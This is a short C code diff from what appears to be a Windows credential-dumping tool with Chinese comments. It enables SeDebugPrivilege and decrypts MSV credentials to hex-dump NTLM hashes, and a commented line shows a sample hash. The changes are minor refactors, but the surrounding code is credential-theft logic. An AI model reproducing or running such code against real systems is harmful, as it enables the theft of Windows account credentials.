@@ -17,7 +17,7 @@ BOOL EnableSeDebugPrivilege() {
 	// 打开当前进程的访问令牌
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return FALSE;
 	// 获取 SeDebugPrivilege 的 LUID
-	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
+	if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
 		CloseHandle(hToken);
 		return FALSE;
 	}
@@ -274,7 +274,7 @@ VOID GetCredentialsFromMSV() {
 			if (DecryptCredentials((char*)(password->Buffer), password->MaximumLength,
 				(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
 				// HexdumpBytesPacked((PBYTE)passDecrypted, sizeof passDecrypted);
-				HexdumpBytesPacked((PBYTE)passDecrypted+0x4A, 16);
+				HexdumpBytesPacked((PBYTE)passDecrypted+NTLMHASH_OFFSET, NTLMHASH_SIZE);
 				wprintf(L"\n");
 				// wprintf(L"%ls\n\n", passDecrypted);
 				// bb 4c b5 54 c0 12 92 2f c3 59 23 44 28 7d 8d 31 3b 6e 5b f6
